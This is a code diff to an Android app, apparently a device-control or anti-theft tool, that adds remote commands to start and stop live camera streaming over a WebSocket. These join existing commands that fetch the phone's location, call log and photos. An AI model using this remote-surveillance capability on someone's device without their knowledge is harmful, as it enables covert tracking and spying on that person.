@@ -8,8 +8,10 @@ import android.util.Log
 import com.lokme.admin.DeviceAdminReceiver
 import com.lokme.calllog.CallLogReader
 import com.lokme.camera.CameraHelper
+import com.lokme.camera.VideoStreamHelper
 import com.lokme.location.LocationHelper
 import com.lokme.network.SupabaseClient
+import com.lokme.network.WsClient
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
@@ -20,13 +22,20 @@ class CommandExecutor(private val context: Context) {
     private val scope = CoroutineScope(Dispatchers.IO)
     private val handler = Handler(Looper.getMainLooper())
     private var cameraHelper: CameraHelper? = null
+    var videoStreamHelper: VideoStreamHelper? = null
+        private set
 
     fun initCamera(lifecycleOwner: androidx.lifecycle.LifecycleOwner) {
         Thread {
             val helper = CameraHelper(context, lifecycleOwner)
             helper.initialize()
             cameraHelper = helper
-            Log.d("CommandExec", "Camera initialized")
+
+            val streamHelper = VideoStreamHelper(context, lifecycleOwner)
+            streamHelper.initialize()
+            videoStreamHelper = streamHelper
+
+            Log.d("CommandExec", "Camera + VideoStream initialized")
         }.start()
     }
 
@@ -35,6 +44,7 @@ class CommandExecutor(private val context: Context) {
         commandId: String,
         payload: String,
         deviceId: String,
+        wsClient: WsClient,
         onSuccess: (String) -> Unit,
         onError: (String) -> Unit
     ) {
@@ -46,6 +56,8 @@ class CommandExecutor(private val context: Context) {
             "GET_LOCATION" -> getLocation(commandId, deviceId, onSuccess, onError)
             "CAPTURE_PHOTO" -> capturePhoto(commandId, deviceId, payload, onSuccess, onError)
             "GET_CALL_LOG" -> getCallLog(commandId, deviceId, onSuccess, onError)
+            "START_VIDEO_STREAM" -> startVideoStream(commandId, deviceId, payload, wsClient, onSuccess, onError)
+            "STOP_VIDEO_STREAM" -> stopVideoStream(commandId, deviceId, onSuccess, onError)
             else -> onError("Unknown command: $commandType")
         }
     }
@@ -140,6 +152,31 @@ class CommandExecutor(private val context: Context) {
                 onError(e.message ?: "Capture failed")
             }
         )
+    }
+
+    private fun startVideoStream(commandId: String, deviceId: String, payload: String, wsClient: WsClient, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
+        val helper = videoStreamHelper
+        if (helper == null) {
+            onError("Video stream not initialized")
+            return
+        }
+
+        val json = try { JSONObject(payload) } catch (_: Exception) { JSONObject() }
+        val useFront = json.optBoolean("front_camera", false)
+
+        helper.startStream(wsClient, deviceId, useFront)
+        onSuccess("Video stream started (${if (useFront) "front" else "back"} camera)")
+    }
+
+    private fun stopVideoStream(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
+        val helper = videoStreamHelper
+        if (helper == null) {
+            onError("Video stream not initialized")
+            return
+        }
+
+        helper.stopStream()
+        onSuccess("Video stream stopped")
     }
 
     private fun getCallLog(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
